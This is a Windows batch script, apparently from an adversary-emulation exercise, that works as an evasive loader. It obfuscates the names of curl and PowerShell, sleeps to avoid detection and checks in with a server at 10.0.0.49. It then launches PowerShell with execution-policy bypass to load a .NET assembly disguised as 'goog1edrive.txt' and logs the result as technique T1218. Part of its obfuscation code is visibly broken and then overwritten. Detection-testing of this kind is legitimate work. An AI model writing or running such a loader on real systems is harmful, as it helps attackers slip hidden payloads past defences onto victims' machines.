@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ constants (plain literals - NEVER encoded)
SET txisnba=%APPDATA%\7946\e9914e3c
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?7946-7
SET jwcnifl=ITZEL-S2BO
SET rrocubc=7
SET xzanpex=goog1edrive.txt
SET dvhhyc=7946

REM Derived paths
SET logfile=%APPDATA%\%rrocubc%\macula-simulations.log
SET tempdir=%APPDATA%\%rrocubc%

REM Initial delay
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: initial_delay_start=30s>>> "%logfile%" 2>nul
timeout /t 30 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: initial_delay_complete>>> "%logfile%" 2>nul

REM Encode "curl" character-by-character
SET a=c
SET b=u
SET c=r
SET d=l
SET curlbin=%a%%b%%c%%d%.exe
SET vfl=-k
SET fkg=-s
SET yrx=-o
SET plq=nul

REM Check server availability
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: heartbeat_check_start=!keghkgto!>>> "%logfile%" 2>nul
%curlbin% %vfl% %fkg% %yrx% %plq% !keghkgto!
SET hbresult=%ERRORLEVEL%
IF !hbresult! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: heartbeat_check_success>>> "%logfile%" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: heartbeat_check_failed=!hbresult!>>> "%logfile%" 2>nul
)

REM Random delay
SET /A dl1=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: random_delay_start=!dl1!s>>> "%logfile%" 2>nul
timeout /t !dl1! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: random_delay_complete>>> "%logfile%" 2>nul

REM Change to temp directory
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: chdir_start=!tempdir!>>> "%logfile%" 2>nul
cd /d "!tempdir!"
IF !ERRORLEVEL! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: chdir_success>>> "%logfile%" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: chdir_failed>>> "%logfile%" 2>nul
)

REM Short delay
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: short_delay_start=5s>>> "%logfile%" 2>nul
ping -n 6 127.0.0.1 >nul
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: short_delay_complete>>> "%logfile%" 2>nul

REM Encode "powershell.exe" using string substitution
SET psbin=YXZshZZll.XWX
SET psbin=!psbin:Y=p!
SET psbin=!psbin:X=e!
SET psbin=!psbin:Z=e!
SET psbin=!psbin:V=o!
SET psbin=!psbin:W=x!
SET psbin=!psbin:Y=p!
SET psbin=!psbin:l=r!
SET psbin=!psbin:!=w!
SET psbin=!psbin:@=s!
SET psbin=!psbin:#=h!
SET psbin=!psbin:^=l!
SET psbin=!psbin:%=l!
REM Final: powershell.exe
SET psbin=powershell.exe

REM Build command parts
SET cmd1=-ep bypass -command "set-location -path 
SET cmd2=!tempdir!
SET cmd3=; import-module .\
SET cmd4=CL_LoadAssembly.ps1
SET cmd5=; LoadAssemblyFromPath 
SET cmd6=!txisnba!\!xzanpex!
SET cmd7=;[Program]::Dale()"

REM Execute .NET DLL via PowerShell
echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: powershell_exec_start>>> "%logfile%" 2>nul
%psbin% !cmd1!!cmd2!!cmd3!!cmd4!!cmd5!!cmd6!!cmd7!

REM Capture result for TTP logging
SET ttp_result=1
SET ttp_error=
IF !ERRORLEVEL! NEQ 0 (
    SET ttp_result=0
    SET ttp_error=powershell_failed_!ERRORLEVEL!
)

REM TTP logging
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET datetime=%%I
SET timestamp=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2! !datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
(
    echo [!timestamp!][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218^|Signed Binary Proxy Execution=!ttp_result!:!ttp_error!
) >> "!logfile!" 2>nul || (

)

echo [!DATE! !TIME!][DEBUG][%jwcnifl%]: script_complete>>> "%logfile%" 2>nul

ENDLOCAL